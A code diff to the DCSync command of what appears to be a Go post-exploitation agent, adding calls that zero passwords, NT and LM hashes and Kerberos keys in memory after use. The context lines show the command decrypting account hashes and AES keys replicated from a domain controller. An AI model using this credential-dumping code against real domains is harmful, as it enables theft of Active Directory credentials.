@@ -137,9 +137,12 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 			hash = parts[1]
 		}
 		cred = sspcred.NewFromNTHash(credUser, hash)
+		structs.ZeroString(&hash)
 	} else {
 		cred = sspcred.NewFromPassword(credUser, args.Password)
 	}
+	structs.ZeroString(&args.Password)
+	structs.ZeroString(&args.Hash)
 
 	ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background(),
 		gssapi.WithCredential(cred),
@@ -397,16 +400,20 @@ func dcsyncParseReply(cli drsuapi.DrsuapiClient, nc *drsuapi.GetNCChangesRespons
 		pwd, err := drsuapi.DecryptHash(cli.Conn().Context(), result.RID, unicodePwd)
 		if err == nil {
 			result.NTHash = hex.EncodeToString(pwd)
+			structs.ZeroBytes(pwd)
 		}
 	}
+	structs.ZeroBytes(unicodePwd)
 
 	// Decrypt LM hash
 	if len(dbcsPwd) > 0 {
 		pwd, err := drsuapi.DecryptHash(cli.Conn().Context(), result.RID, dbcsPwd)
 		if err == nil {
 			result.LMHash = hex.EncodeToString(pwd)
+			structs.ZeroBytes(pwd)
 		}
 	}
+	structs.ZeroBytes(dbcsPwd)
 
 	// Decrypt supplemental credentials (Kerberos keys)
 	if len(supplementalCreds) > 0 {
@@ -421,8 +428,10 @@ func dcsyncParseReply(cli drsuapi.DrsuapiClient, nc *drsuapi.GetNCChangesRespons
 					}
 				}
 			}
+			structs.ZeroBytes(creds)
 		}
 	}
+	structs.ZeroBytes(supplementalCreds)
 
 	return result
 }
@@ -437,6 +446,7 @@ func dcsyncExtractKerberosKeys(prop *samr.UserProperty, result *dcsyncResult) {
 	case *samr.KerberosStoredCredentialNew:
 		for _, key := range cred.Credentials {
 			keyHex := hex.EncodeToString(key.KeyData)
+			structs.ZeroBytes(key.KeyData)
 			switch key.KeyType {
 			case 18: // AES256-CTS-HMAC-SHA1
 				result.AES256Key = keyHex
@@ -447,6 +457,7 @@ func dcsyncExtractKerberosKeys(prop *samr.UserProperty, result *dcsyncResult) {
 	case *samr.KerberosStoredCredential:
 		for _, key := range cred.Credentials {
 			keyHex := hex.EncodeToString(key.KeyData)
+			structs.ZeroBytes(key.KeyData)
 			switch key.KeyType {
 			case 18:
 				result.AES256Key = keyHex
